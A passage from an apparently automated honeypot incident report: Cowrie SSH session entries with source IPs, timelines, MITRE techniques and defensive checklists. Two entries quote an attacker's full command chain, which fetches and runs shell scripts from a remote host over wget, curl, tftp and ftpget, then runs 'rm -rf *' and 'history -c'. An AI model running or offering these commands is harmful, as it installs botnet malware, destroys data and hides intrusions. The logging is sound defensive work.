| `2026-06-25 15:28:59` | `cowrie.login.success` |
| `2026-06-25 15:29:00` | `cowrie.session.params` |
| `2026-06-25 15:29:00` | `cowrie.command.input` |
| `2026-06-25 15:29:00` | `cowrie.log.closed` |
| `2026-06-25 15:29:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f13b47f89f76

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 15:30 |
| **Last Seen** | 2026-06-25 15:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:30:01` | `cowrie.session.connect` |
| `2026-06-25 15:30:01` | `cowrie.client.version` |
| `2026-06-25 15:30:01` | `cowrie.client.kex` |
| `2026-06-25 15:30:02` | `cowrie.login.success` |
| `2026-06-25 15:30:03` | `cowrie.session.params` |
| `2026-06-25 15:30:03` | `cowrie.command.input` |
| `2026-06-25 15:30:03` | `cowrie.log.closed` |
| `2026-06-25 15:30:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d20a8e4a9880

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 15:31 |
| **Last Seen** | 2026-06-25 15:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:31:06` | `cowrie.session.connect` |
| `2026-06-25 15:31:06` | `cowrie.client.version` |
| `2026-06-25 15:31:06` | `cowrie.client.kex` |
| `2026-06-25 15:31:07` | `cowrie.login.success` |
| `2026-06-25 15:31:07` | `cowrie.session.params` |
| `2026-06-25 15:31:07` | `cowrie.command.input` |
| `2026-06-25 15:31:07` | `cowrie.log.closed` |
| `2026-06-25 15:31:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4ad0219e521

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 15:32 |
| **Last Seen** | 2026-06-25 15:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:32:08` | `cowrie.session.connect` |
| `2026-06-25 15:32:08` | `cowrie.client.version` |
| `2026-06-25 15:32:08` | `cowrie.client.kex` |
| `2026-06-25 15:32:08` | `cowrie.login.success` |
| `2026-06-25 15:32:09` | `cowrie.session.params` |
| `2026-06-25 15:32:09` | `cowrie.command.input` |
| `2026-06-25 15:32:09` | `cowrie.log.closed` |
| `2026-06-25 15:32:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0337eb0eb6a2

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 15:33 |
| **Last Seen** | 2026-06-25 15:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:33:11` | `cowrie.session.connect` |
| `2026-06-25 15:33:11` | `cowrie.client.version` |
| `2026-06-25 15:33:11` | `cowrie.client.kex` |
| `2026-06-25 15:33:12` | `cowrie.login.success` |
| `2026-06-25 15:33:13` | `cowrie.session.params` |
| `2026-06-25 15:33:13` | `cowrie.command.input` |
| `2026-06-25 15:33:13` | `cowrie.log.closed` |
| `2026-06-25 15:33:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6cf8a90cc278

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 15:34 |
| **Last Seen** | 2026-06-25 15:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:34:10` | `cowrie.session.connect` |
| `2026-06-25 15:34:10` | `cowrie.client.version` |
| `2026-06-25 15:34:10` | `cowrie.client.kex` |
| `2026-06-25 15:34:11` | `cowrie.login.success` |
| `2026-06-25 15:34:11` | `cowrie.session.params` |
| `2026-06-25 15:34:11` | `cowrie.command.input` |
| `2026-06-25 15:34:12` | `cowrie.log.closed` |
| `2026-06-25 15:34:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6c828325150

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 15:35 |
| **Last Seen** | 2026-06-25 15:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:35:13` | `cowrie.session.connect` |
| `2026-06-25 15:35:13` | `cowrie.client.version` |
| `2026-06-25 15:35:13` | `cowrie.client.kex` |
| `2026-06-25 15:35:13` | `cowrie.login.success` |
| `2026-06-25 15:35:14` | `cowrie.session.params` |
| `2026-06-25 15:35:14` | `cowrie.command.input` |
| `2026-06-25 15:35:14` | `cowrie.log.closed` |
| `2026-06-25 15:35:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91814585f1ea

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 15:36 |
| **Last Seen** | 2026-06-25 15:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:36:17` | `cowrie.session.connect` |
| `2026-06-25 15:36:17` | `cowrie.client.version` |
| `2026-06-25 15:36:18` | `cowrie.client.kex` |
| `2026-06-25 15:36:18` | `cowrie.login.success` |
| `2026-06-25 15:36:19` | `cowrie.session.params` |
| `2026-06-25 15:36:19` | `cowrie.command.input` |
| `2026-06-25 15:36:19` | `cowrie.log.closed` |
| `2026-06-25 15:36:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4dd5cb1806b

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 15:37 |
| **Last Seen** | 2026-06-25 15:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:37:26` | `cowrie.session.connect` |
| `2026-06-25 15:37:26` | `cowrie.client.version` |
| `2026-06-25 15:37:26` | `cowrie.client.kex` |
| `2026-06-25 15:37:27` | `cowrie.login.success` |
| `2026-06-25 15:37:27` | `cowrie.session.params` |
| `2026-06-25 15:37:27` | `cowrie.command.input` |
| `2026-06-25 15:37:28` | `cowrie.log.closed` |
| `2026-06-25 15:37:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-645cb68ccc91

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-25 15:37 |
| **Last Seen** | 2026-06-25 15:38 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:37:51` | `cowrie.session.connect` |
| `2026-06-25 15:37:52` | `cowrie.client.version` |
| `2026-06-25 15:37:52` | `cowrie.client.kex` |
| `2026-06-25 15:37:58` | `cowrie.login.success` |
| `2026-06-25 15:38:02` | `cowrie.session.params` |
| `2026-06-25 15:38:02` | `cowrie.command.input` |
| `2026-06-25 15:38:03` | `cowrie.log.closed` |
| `2026-06-25 15:38:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b373c86f870

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 15:38 |
| **Last Seen** | 2026-06-25 15:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:38:33` | `cowrie.session.connect` |
| `2026-06-25 15:38:33` | `cowrie.client.version` |
| `2026-06-25 15:38:33` | `cowrie.client.kex` |
| `2026-06-25 15:38:34` | `cowrie.login.success` |
| `2026-06-25 15:38:35` | `cowrie.session.params` |
| `2026-06-25 15:38:35` | `cowrie.command.input` |
| `2026-06-25 15:38:35` | `cowrie.log.closed` |
| `2026-06-25 15:38:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec72b48e43ce

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 15:39 |
| **Last Seen** | 2026-06-25 15:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:39:41` | `cowrie.session.connect` |
| `2026-06-25 15:39:41` | `cowrie.client.version` |
| `2026-06-25 15:39:41` | `cowrie.client.kex` |
| `2026-06-25 15:39:41` | `cowrie.login.success` |
| `2026-06-25 15:39:42` | `cowrie.session.params` |
| `2026-06-25 15:39:42` | `cowrie.command.input` |
| `2026-06-25 15:39:42` | `cowrie.log.closed` |
| `2026-06-25 15:39:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ac021e43d5e

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-25 15:40 |
| **Last Seen** | 2026-06-25 15:40 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:40:37` | `cowrie.session.connect` |
| `2026-06-25 15:40:38` | `cowrie.client.version` |
| `2026-06-25 15:40:38` | `cowrie.client.kex` |
| `2026-06-25 15:40:40` | `cowrie.login.success` |
| `2026-06-25 15:40:42` | `cowrie.session.params` |
| `2026-06-25 15:40:42` | `cowrie.command.input` |
| `2026-06-25 15:40:42` | `cowrie.log.closed` |
| `2026-06-25 15:40:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-865121ff6432

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 15:40 |
| **Last Seen** | 2026-06-25 15:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:40:50` | `cowrie.session.connect` |
| `2026-06-25 15:40:50` | `cowrie.client.version` |
| `2026-06-25 15:40:50` | `cowrie.client.kex` |
| `2026-06-25 15:40:50` | `cowrie.login.success` |
| `2026-06-25 15:40:51` | `cowrie.session.params` |
| `2026-06-25 15:40:51` | `cowrie.command.input` |
| `2026-06-25 15:40:51` | `cowrie.log.closed` |
| `2026-06-25 15:40:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-beb311d5576e

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 15:41 |
| **Last Seen** | 2026-06-25 15:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:41:52` | `cowrie.session.connect` |
| `2026-06-25 15:41:52` | `cowrie.client.version` |
| `2026-06-25 15:41:52` | `cowrie.client.kex` |
| `2026-06-25 15:41:52` | `cowrie.login.success` |
| `2026-06-25 15:41:53` | `cowrie.session.params` |
| `2026-06-25 15:41:53` | `cowrie.command.input` |
| `2026-06-25 15:41:53` | `cowrie.log.closed` |
| `2026-06-25 15:41:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-421084356320

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 15:42 |
| **Last Seen** | 2026-06-25 15:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:42:57` | `cowrie.session.connect` |
| `2026-06-25 15:42:57` | `cowrie.client.version` |
| `2026-06-25 15:42:58` | `cowrie.client.kex` |
| `2026-06-25 15:42:58` | `cowrie.login.success` |
| `2026-06-25 15:42:59` | `cowrie.session.params` |
| `2026-06-25 15:42:59` | `cowrie.command.input` |
| `2026-06-25 15:42:59` | `cowrie.log.closed` |
| `2026-06-25 15:42:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-781a039ce52b

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 15:44 |
| **Last Seen** | 2026-06-25 15:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:44:00` | `cowrie.session.connect` |
| `2026-06-25 15:44:00` | `cowrie.client.version` |
| `2026-06-25 15:44:00` | `cowrie.client.kex` |
| `2026-06-25 15:44:01` | `cowrie.login.success` |
| `2026-06-25 15:44:01` | `cowrie.session.params` |
| `2026-06-25 15:44:01` | `cowrie.command.input` |
| `2026-06-25 15:44:01` | `cowrie.log.closed` |
| `2026-06-25 15:44:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77be722268b6

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 15:45 |
| **Last Seen** | 2026-06-25 15:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:45:06` | `cowrie.session.connect` |
| `2026-06-25 15:45:06` | `cowrie.client.version` |
| `2026-06-25 15:45:06` | `cowrie.client.kex` |
| `2026-06-25 15:45:07` | `cowrie.login.success` |
| `2026-06-25 15:45:07` | `cowrie.session.params` |
| `2026-06-25 15:45:07` | `cowrie.command.input` |
| `2026-06-25 15:45:08` | `cowrie.log.closed` |
| `2026-06-25 15:45:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ad7c45020aa

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 15:46 |
| **Last Seen** | 2026-06-25 15:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:46:05` | `cowrie.session.connect` |
| `2026-06-25 15:46:05` | `cowrie.client.version` |
| `2026-06-25 15:46:06` | `cowrie.client.kex` |
| `2026-06-25 15:46:06` | `cowrie.login.success` |
| `2026-06-25 15:46:07` | `cowrie.session.params` |
| `2026-06-25 15:46:07` | `cowrie.command.input` |
| `2026-06-25 15:46:07` | `cowrie.log.closed` |
| `2026-06-25 15:46:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9aa2a11e0cad

| Field | Detail |
|---|---|
| **Source IP** | `51.158.248[.]122` |
| **First Seen** | 2026-06-25 15:47 |
| **Last Seen** | 2026-06-25 15:50 |
| **Session Duration** | 180s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh, cd /tmp; wget hxxp://51.158.248[.]122:8517/bins.sh; curl -O hxxp://51.158.248[.]122:8517/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 51.158.248[.]122 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 51.158.248[.]122; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 51.158.248[.]122 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *; history -c` |
| **Download Attempts** | hxxp://51.158.248[.]122:8517/bins.sh |
| **Malware Analysis** | 7b61a0032297d2b400d3dd5e69556a8ca31adb717464c247aaf997f4b4de26f6 (LOW) |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:47:04` | `cowrie.session.connect` |
| `2026-06-25 15:47:04` | `cowrie.login.success` |
| `2026-06-25 15:47:04` | `cowrie.session.params` |
| `2026-06-25 15:47:06` | `cowrie.command.input` |
| `2026-06-25 15:47:06` | `cowrie.command.input` |
| `2026-06-25 15:47:06` | `cowrie.session.file_download` |
| `2026-06-25 15:47:06` | `cowrie.session.file_download.failed` |
| `2026-06-25 15:47:21` | `cowrie.session.file_download.failed` |
| `2026-06-25 15:47:36` | `cowrie.session.file_download.failed` |
| `2026-06-25 15:47:37` | `cowrie.session.file_download.failed` |
| `2026-06-25 15:50:04` | `cowrie.log.closed` |
| `2026-06-25 15:50:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.158.248[.]122` to AbuseIPDB if not already reported
- [ ] Block `51.158.248[.]122` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fff3815baaa4

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 15:47 |
| **Last Seen** | 2026-06-25 15:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:47:09` | `cowrie.session.connect` |
| `2026-06-25 15:47:09` | `cowrie.client.version` |
| `2026-06-25 15:47:09` | `cowrie.client.kex` |
| `2026-06-25 15:47:09` | `cowrie.login.success` |
| `2026-06-25 15:47:10` | `cowrie.session.params` |
| `2026-06-25 15:47:10` | `cowrie.command.input` |
| `2026-06-25 15:47:10` | `cowrie.log.closed` |
| `2026-06-25 15:47:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbadf076da6e

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 15:48 |
| **Last Seen** | 2026-06-25 15:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:48:17` | `cowrie.session.connect` |
| `2026-06-25 15:48:17` | `cowrie.client.version` |
| `2026-06-25 15:48:18` | `cowrie.client.kex` |
| `2026-06-25 15:48:18` | `cowrie.login.success` |
| `2026-06-25 15:48:19` | `cowrie.session.params` |
| `2026-06-25 15:48:19` | `cowrie.command.input` |
| `2026-06-25 15:48:19` | `cowrie.log.closed` |
| `2026-06-25 15:48:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

```
⚠️  MALWARE ANALYSIS — HIGH SEVERITY SAMPLE DETECTED
   File  : 725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f  (Bash Script)
   SHA256: 725d1de20672ed85f32e823fe067ed6eb17149019e146baf...
   Score : 84/100  |  VT: 37/75
   ↳ Download via wget: wget
   ↳ Download via curl: curl
   ↳ chmod +x (make executable): chmod +x
   ↳ IP:Port (possible C2): 51.158.248[.]122:8517
```

### 🔴 HIGH · IR-af59886ca7a8

| Field | Detail |
|---|---|
| **Source IP** | `51.158.248[.]122` |
| **First Seen** | 2026-06-25 15:49 |
| **Last Seen** | 2026-06-25 15:49 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh, cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://51.158.248[.]122:8517/bins.sh; curl -O hxxp://51.158.248[.]122:8517/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 51.158.248[.]122 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 51.158.248[.]122; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 51.158.248[.]122 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *; history -c` |
| **Download Attempts** | hxxp://51.158.248[.]122:8517/bins.sh, hxxp://51.158.248[.]122:8517/bins.sh, hxxp://51.158.248[.]122:8517/armv6l |
| **Malware Analysis** | 725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f (HIGH), 7b61a0032297d2b400d3dd5e69556a8ca31adb717464c247aaf997f4b4de26f6 (LOW), 494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984 (MEDIUM), 6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c (MEDIUM), 80e404f6a1b7c29380ce6a82ed5379e81b3bd50f9ddfde1ab6a849d30959a3d4 (MEDIUM) |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:49:07` | `cowrie.session.connect` |
| `2026-06-25 15:49:07` | `cowrie.login.success` |
| `2026-06-25 15:49:08` | `cowrie.session.params` |
| `2026-06-25 15:49:09` | `cowrie.command.input` |
| `2026-06-25 15:49:09` | `cowrie.command.input` |
| `2026-06-25 15:49:10` | `cowrie.session.file_download` |
| `2026-06-25 15:49:10` | `cowrie.session.file_download` |
| `2026-06-25 15:49:10` | `cowrie.session.file_download` |
| `2026-06-25 15:49:10` | `cowrie.session.file_download.failed` |
| `2026-06-25 15:49:10` | `cowrie.session.file_download.failed` |
| `2026-06-25 15:49:10` | `cowrie.session.file_download` |
| `2026-06-25 15:49:11` | `cowrie.session.file_download` |
| `2026-06-25 15:49:11` | `cowrie.session.file_download` |
| `2026-06-25 15:49:11` | `cowrie.session.file_download` |
| `2026-06-25 15:49:11` | `cowrie.session.file_download` |
| `2026-06-25 15:49:11` | `cowrie.session.file_download` |
| `2026-06-25 15:49:24` | `cowrie.log.closed` |
| `2026-06-25 15:49:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.158.248[.]122` to AbuseIPDB if not already reported
- [ ] Block `51.158.248[.]122` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Review VT report: hxxps://www.virustotal.com/gui/file/725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94bf867022e8

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 15:49 |
| **Last Seen** | 2026-06-25 15:49 |
